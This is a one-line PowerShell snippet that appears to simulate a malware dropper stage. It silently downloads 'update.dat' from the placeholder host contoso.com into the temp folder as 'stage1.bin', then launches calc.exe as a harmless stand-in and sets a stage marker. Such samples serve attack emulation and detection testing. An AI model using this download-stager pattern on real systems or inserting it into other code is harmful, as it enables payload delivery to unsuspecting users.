
$PayloadUrl = "http://contoso.com/update.dat"; $DownloadPath = "$env:TEMP\stage1.bin"; curl.exe -s -L -o $DownloadPath $PayloadUrl; Start-Process -FilePath 'calc.exe'; $StageMarker = "stage-24"
